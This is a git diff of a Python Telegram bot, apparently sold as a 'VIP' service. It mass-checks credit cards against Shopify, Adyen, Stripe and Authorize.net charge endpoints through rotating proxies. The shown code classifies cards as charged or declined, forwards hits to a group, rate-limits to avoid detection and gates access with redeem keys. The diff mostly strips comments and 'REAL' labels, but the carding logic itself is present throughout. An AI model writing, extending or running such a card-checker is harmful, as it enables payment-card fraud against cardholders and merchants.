@@ -1,6 +1,3 @@
-# ==============================================================================
-# SHOPIFY VIP BOT - ULTIMATE PRODUCTION SYSTEM (REAL CHECK ENGINE v3.0)
-# ==============================================================================
 import asyncio
 import aiohttp
 import aiofiles
@@ -54,7 +51,6 @@ _original_inline_keyboard_button.to_dict = _patched_to_dict
 logging.basicConfig(stream=sys.stdout, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger("VIP_BOT")
 
-# ====================== CONFIG & GLOBALS ======================
 BOT_TOKEN = os.getenv('BOT_TOKEN', '').strip()
 ADMIN_ID = [int(x.strip()) for x in os.getenv("ADMIN_ID", "8879293808,8170592405").split(",") if x.strip()]
 GITHUB_TOKEN = os.getenv("GITHUB_TOKEN", "").strip()
@@ -84,7 +80,6 @@ JOIN_CHANNEL_TARGET = get_valid_target(JOIN_CHANNEL_LINK, JOIN_CHANNEL_ID)
 JOIN_GROUP_TARGET = get_valid_target(JOIN_GROUP_LINK, JOIN_GROUP_ID)
 HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)
 
-# ====================== API ENDPOINTS ======================
 SHOPIFY_API_URL_1 = 'https://web-production-c2d03.up.railway.app/shopify'
 ADYEN_API_URL = 'https://gates.valyrian.cc/triumph/check'
 STRIPE_API_URL = 'https://gates.valyrian.cc/gospel-piano/check'
@@ -93,7 +88,6 @@ GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.
 GITHUB_API_SITES_URL = os.getenv("GITHUB_API_SITES_URL", "")
 KEYS_FILE = "redeem_keys.json"
 
-# ====================== CPM & SPEED CONTROL ======================
 CPM_TARGET = int(os.getenv("CPM_TARGET", "30"))
 MIN_DELAY = float(os.getenv("MIN_DELAY", "0.5"))
 MAX_DELAY = float(os.getenv("MAX_DELAY", "2.0"))
@@ -121,7 +115,6 @@ PENDING_FILES = {}
 
 TEST_CARD = "4111111111111111|12|2027|123"
 
-# ====================== SAFE CHARGED FONT ENGINE ======================
 def sf(text) -> str:
     if text is None: return ""
     res = ""
@@ -159,8 +152,6 @@ def escape_html(text):
     if not text: return "Unknown"
     return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
 
-
-# ====================== TELEGRAM PREMIUM CUSTOM EMOJIS ======================
 CE_CROWN = '<tg-emoji emoji-id="5217822164362739968">👑</tg-emoji>'
 CE_DIAMOND = '<tg-emoji emoji-id="5427168083074628963">💎</tg-emoji>'
 CE_MIC = '<tg-emoji emoji-id="5224736245665511429">🎤</tg-emoji>'
@@ -197,7 +188,6 @@ CE_GEAR = '<tg-emoji emoji-id="5341715473882955310">⚙️</tg-emoji>'
 CE_SNOW = '<tg-emoji emoji-id="5449449325434266744">❄️</tg-emoji>'
 CE_BOOM = '<tg-emoji emoji-id="5276032951342088188">💥</tg-emoji>'
 
-# ====================== FLAG TRANSLATIONS ======================
 ISO3_TO_ISO2 = {
     "ABW": "AW", "AFG": "AF", "AGO": "AO", "AIA": "AI", "ALA": "AX", "ALB": "AL", "AND": "AD", "ARE": "AE",
     "ARG": "AR", "ARM": "AM", "ASM": "AS", "ATA": "AQ", "ATF": "TF", "ATG": "AG", "AUS": "AU", "AUT": "AT",
@@ -421,7 +411,6 @@ async def styled_send(bot, chat_id, text, buttons=None, use_gif=True, specific_g
         try: return await bot.send_message(chat_id=chat_id, text=text, reply_markup=markup, parse_mode=ParseMode.HTML)
         except RetryAfter as e: await asyncio.sleep(e.retry_after + 0.5)
         except Exception: return None
-
 
 async def load_keys():
     async with get_system_lock("keys"):
@@ -718,8 +707,6 @@ async def get_bin_info(bin_code, session=None):
     except Exception: pass
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "Unknown", "country_code": "", "flag": "\U0001f310"}
 
-
-# ====================== REAL SHOPIFY GATEWAY ENGINE v3.0 ======================
 async def check_shopify_api(api_url, card, site, proxy, session):
     try:
         proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else (proxy if proxy else None)
@@ -742,7 +729,6 @@ async def check_shopify_api(api_url, card, site, proxy, session):
         async with session.get(req_url, headers=headers, timeout=API_TIMEOUT, ssl=False) as resp:
             text_data = await resp.text()
 
-            # ===== HTTP STATUS BASED SITE ERRORS (REAL) =====
             if resp.status == 404:
                 return {'status': 'Site Error', 'message': f'HTTP 404 - Not Found', 'card': card}
             if resp.status == 504:
@@ -770,7 +756,6 @@ async def check_shopify_api(api_url, card, site, proxy, session):
             if not text_data or not text_data.strip():
                 return {'status': 'Site Error', 'message': 'Empty Response', 'card': card}
 
-            # ===== PARSE REAL API JSON RESPONSE =====
             gt = "Shopify"
             pr = None
             rm = text_data.strip()
@@ -778,7 +763,7 @@ async def check_shopify_api(api_url, card, site, proxy, session):
 
             try:
                 rj = json.loads(text_data)
-                # Extract the REAL response message from API
+                # Extract the response message from API
                 rm = str(rj.get('response_msg',
                          rj.get('result',
                          rj.get('Response',
@@ -814,7 +799,6 @@ async def check_shopify_api(api_url, card, site, proxy, session):
                 if api_status in ['site_error', 'error', 'timeout', 'unreachable']:
                     return {'status': 'Site Error', 'message': rm, 'card': card}
 
-            # ===== FALLBACK: Classify based on actual response text (no fake guessing) =====
             clean_rm = unsf(rm).lower().strip()
 
             # CHARGED - only if API explicitly says charged/success
@@ -856,8 +840,7 @@ async def check_shopify_api(api_url, card, site, proxy, session):
     except Exception as e:
         return {'status': 'Site Error', 'message': f'System Error: {str(e)[:30]}', 'card': card}
 
-# ====================== REAL ADYEN GATEWAY ENGINE v3.0 ======================
-# Adyen Triumph Gate - Real API Check
+# Adyen Triumph Gate
 async def check_adyen_api(card, proxy, session):
     try:
         proxy_url = proxy['proxy_url'] if isinstance(proxy, dict) else (proxy if proxy else None)
@@ -899,7 +882,6 @@ async def check_adyen_api(card, proxy, session):
                 pass
             clean_rm = unsf(rm).lower().strip()
 
-            # ===== ADYEN REAL RESPONSES =====
             # CHARGED / AUTHORISED
             charged_keywords = [
                 'authorised', 'authorized', 'success', 'payment completed', 'transaction completed',
@@ -963,8 +945,6 @@ async def check_adyen_api(card, proxy, session):
     except Exception as e:
         return {'status': 'Site Error', 'message': f'System Error: {str(e)[:30]}', 'card': card}
 
-
-# ====================== REAL STRIPE GATEWAY ENGINE v3.0 ======================
 # Stripe Gospel-Piano Gate - $1 Charge
 STRIPE_PRICE = "$1.00"
 
@@ -1009,7 +989,6 @@ async def check_stripe_api(card, proxy, session):
                 pass
             clean_rm = unsf(rm).lower().strip()
 
-            # ===== STRIPE REAL RESPONSES =====
             # CHARGED / SUCCEEDED
             charged_keywords = [
                 'succeeded', 'success', 'payment succeeded', 'charged', 'completed',
@@ -1075,7 +1054,6 @@ async def check_stripe_api(card, proxy, session):
     except Exception as e:
         return {'status': 'Site Error', 'message': f'System Error: {str(e)[:30]}', 'card': card}
 
-# ====================== REAL AUTHNET GATEWAY ENGINE v3.0 ======================
 AUTHNET_PRICE = "$20.00"
 
 async def check_authnet_api(card, proxy, session):
@@ -1125,8 +1103,6 @@ async def check_authnet_api(card, proxy, session):
     except Exception as e:
         return {'status': 'Site Error', 'message': f'System Error: {str(e)[:30]}', 'card': card}
 
-
-# ====================== REAL PROXY CHECKER ENGINE v3.0 ======================
 async def check_proxy_real(proxy_dict, session, test_card=TEST_CARD, timeout=15):
     proxy_url = proxy_dict.get('proxy_url') if isinstance(proxy_dict, dict) else proxy_dict
     if not proxy_url:
@@ -1174,7 +1150,6 @@ async def check_proxy_real(proxy_dict, session, test_card=TEST_CARD, timeout=15)
     # All URLs failed - proxy is likely dead or extremely slow
     return False, "Proxy Unresponsive (All checks failed)"
 
-# ====================== REAL GATE CHECKER ENGINE (Shopify Only) ======================
 async def check_gate_real(site, proxy_url, session, test_card=TEST_CARD, timeout=15):
     try:
         card_encoded = quote(test_card)
@@ -1207,7 +1182,6 @@ async def check_gate_real(site, proxy_url, session, test_card=TEST_CARD, timeout
     except Exception as e:
         return False, 0, f"Error: {str(e)[:30]}"
 
-# ====================== CPM CONTROLLER ======================
 class CPMController:
     def __init__(self, target_cpm):
         self.target_cpm = target_cpm
@@ -1233,12 +1207,10 @@ class CPMController:
             self.last_request_time = time.time()
             self.request_times.append(self.last_request_time)
 
-# ====================== REAL CHECK CARD ENGINE v3.0 ======================
 async def check_card_real(card, sites, proxies, session, gateway_name, uid):
     p_dict = random.choice(proxies) if proxies else None
     p_url = p_dict['proxy_url'] if p_dict else None
 
-    # ===== SHOPIFY: Try ALL sites, skip any that give Site Error =====
     if gateway_name == "Shopify":
         if not sites:
             sites = ["touch-of-finland.myshopify.com"]
@@ -1254,7 +1226,7 @@ async def check_card_real(card, sites, proxies, session, gateway_name, uid):
             res = await check_shopify_api(SHOPIFY_API_URL_1, card, s_target, p_url, session)
             status = res.get('status')
 
-            # If we got a real response (NOT Site Error), return it immediately
+            # If response is not Site Error, return it immediately
             if status != 'Site Error':
                 return res
 
@@ -1277,7 +1249,6 @@ async def check_card_real(card, sites, proxies, session, gateway_name, uid):
         # All sites exhausted - return last error
         return {'status': 'Site Error', 'message': last_error, 'card': card, 'gateway': gateway_name, 'price': '-'}
 
-    # ===== NON-SHOPIFY GATES (single attempt with retry) =====
     else:
         try:
             if gateway_name == "AuthNet":
@@ -1317,8 +1288,6 @@ async def _send_mass_hit(card, gateway, price, uid, elapsed, bot, session):
         await styled_send(bot, uid, msg, buttons=kb, use_gif=True)
     except Exception: pass
 
-
-# ====================== FILE CHECK COMMAND ======================
 async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global _MAINTENANCE_MODE
     if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
@@ -1360,7 +1329,6 @@ async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE
         await styled_edit(pm, f"<b>{CE_CROWN} {sf('File Loaded Successfully')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Total CCs')}:</b> <code>{sf(str(len(cards)))}</code>\n╰ <b>{CE_TOP} {sf('Please select a Gateway to start')}:</b>", buttons=kb)
     except Exception as e: await styled_edit(pm, f"<b>{CE_CLOWN} {sf('Error')}:</b> {sf(str(e))}")
 
-# ====================== MASTER ROUTER ======================
 async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global _MAINTENANCE_MODE, _CACHED_SHOPIFY_SITES, _LAST_SITES_FETCH
     if not update.message: return
@@ -1460,8 +1428,6 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if len(proxies) > 30: t += f"\n<i>+{sf(str(len(proxies)-30))} {sf('more...')}</i>"
             await styled_reply(update, t, use_gif=True)
 
-
-        # ====================== REAL /chkpxy COMMAND ======================
         elif cmd == "chkpxy":
             if not await force_join_check(update, context): return
             now = time.time()
@@ -1482,7 +1448,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if not proxies:
                 return await styled_reply(update, f"<b>{CE_CLOWN} {sf('No proxies found to check.')}</b>", use_gif=True)
             tm = await styled_reply(update,
-                f"<b>{CE_GEAR} {sf('Starting REAL proxy check...')}</b>\n"
+                f"<b>{CE_GEAR} {sf('Starting proxy check...')}</b>\n"
                 f"├ <b>{CE_DIAMOND} {sf('Total Proxies')}:</b> <code>{len(proxies)}</code>\n"
                 f"╰ <b>{CE_HOURGLASS} {sf('Testing each proxy via Gateway API...')}</b>",
                 use_gif=True)
@@ -1553,7 +1519,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 except Exception as e:
                     logger.error(f"Failed to remove proxy at index {idx}: {e}")
 
-            result_msg = f"""<b>{CE_CROWN} {sf('REAL Proxy Check Complete')} {CE_PARTY}</b>
+            result_msg = f"""<b>{CE_CROWN} {sf('Proxy Check Complete')} {CE_PARTY}</b>
 
 ├ <b>{CE_DIAMOND} {sf('Total Checked')}:</b> <code>{sf(str(checked_count))}/{sf(str(total))}</code>
 ├ <b>{CE_CHECK} {sf('Working')}:</b> <code>{sf(str(working_count))}</code>
@@ -1563,7 +1529,6 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
 <i>{sf('Dead proxies have been permanently removed.')}</i>
 <i>{sf('You cannot use /chkpxy again for 1 hour.')}</i>"""
             await styled_edit(tm, result_msg)
-
 
         elif cmd == "rmpxy":
             if not await force_join_check(update, context): return
@@ -1728,8 +1693,6 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         logger.error(f"Error handling command {cmd}: {e}")
         await styled_reply(update, f"<b>{CE_CLOWN} {sf('System Error')}</b>\n\n╰ {sf('An unexpected error occurred while processing your request.')}", use_gif=True)
 
-
-# ====================== CALLBACK FUNCTIONS ======================
 async def plans_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global _MAINTENANCE_MODE
     q = update.callback_query
@@ -1828,8 +1791,6 @@ async def gateway_selection_cb(update: Update, context: ContextTypes.DEFAULT_TYP
     await styled_edit(msg_obj, f"<b>{CE_GEAR} {sf('Preparing Session...')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Loaded')}:</b> <code>{sf(str(len(cards)))} CCs</code>\n├ <b>{CE_GEAR} {sf('Threads')}:</b> <code>{sf(str(current_workers))}</code>\n├ <b>{CE_FLASH} {sf('CPM Target')}:</b> <code>{sf(str(CPM_TARGET))}</code>\n╰ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gn)}</code>", buttons=None)
     asyncio.create_task(_run_mass_process(update, msg_obj, cards, ACTIVE_MTXT_PROCESSES, "stop_chk", gn, context.bot))
 
-
-# ====================== REAL MASS PROCESSOR WITH CPM CONTROL ======================
 async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_prefix, gate_name, bot):
     uid = update.effective_user.id
     tot = len(cards)
@@ -2018,7 +1979,7 @@ def main():
     app.add_handler(CallbackQueryHandler(prompt_redeem_cb, pattern=r"^prompt_redeem$"))
     app.add_handler(CallbackQueryHandler(check_joined_cb, pattern=r"^check_joined$"))
     app.add_handler(CallbackQueryHandler(empty_callback_handler, pattern=r"^none$"))
-    logger.info("\u2705 VIP BOT v3.0 IS FULLY OPERATIONAL WITH REAL CHECK ENGINE!")
+    logger.info("\u2705 VIP BOT  IS FULLY OPERATIONAL WITH CHECK ENGINE!")
     while True:
         try:
             app.run_polling(drop_pending_updates=True)
